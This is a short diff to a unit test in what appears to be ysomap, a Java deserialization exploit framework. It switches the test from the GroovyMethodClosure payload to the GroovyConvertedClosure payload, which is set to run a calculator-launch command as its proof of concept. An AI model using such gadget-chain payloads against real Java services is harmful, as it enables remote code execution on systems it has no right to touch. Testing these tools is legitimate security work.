@@ -9,11 +9,11 @@ import ysomap.core.serializer.Serializer;
  * @author wh1t3P1g
  * @since 2020/4/18
  */
-public class GroovyMethodClosureTest {
+public class GroovyConvertedClosureTest {
 
     @Test
     public void pack() throws Exception {
-        Payload payload = new GroovyMethodClosure();
+        Payload payload = new GroovyConvertedClosure();
         Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
         payload.setBullet(bullet);
         Serializer serializer = payload.getSerializer();
